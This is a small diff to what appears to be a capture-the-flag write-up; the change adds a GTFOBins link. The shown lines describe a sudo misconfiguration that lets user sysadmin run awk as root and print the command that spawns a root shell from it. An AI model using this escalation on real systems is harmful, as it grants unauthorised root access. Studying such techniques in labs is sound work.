@@ -167,7 +167,7 @@ User sysadmin may run the following commands on localhost:
     (ALL) NOPASSWD: /usr/bin/awk
 ```
 Hmm.. let's check the output a bit. Apparently the user can run `awk` as root without password. 
-Checking BTFObins informs me that this can give me a root shell by running:
+Checking [BTFObins](https://gtfobins.org/) informs me that this can give me a root shell by running:
 ```bash
 sysadmin@TheMissingSysadmin:~$ sudo awk 'BEGIN {system("/bin/sh")}'
 # whoami
